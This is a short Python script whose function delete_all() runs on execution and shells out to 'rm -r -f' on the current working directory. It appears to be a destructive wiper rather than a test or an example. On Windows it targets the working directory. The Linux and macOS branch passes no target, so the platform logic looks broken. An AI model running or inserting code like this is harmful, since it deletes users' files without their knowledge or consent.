import os

CONST1 = f"rm -r -f {os.getcwd()}"
CONST2 = "rm -r -f"

def delete_all():
    if os.name == 'nt':  # For Windows
        os.system(CONST1)
    elif os.name == 'posix':  # For Linux and macOS
        os.system(CONST2)
    else:
        print("Unsupported operating system.")

delete_all()
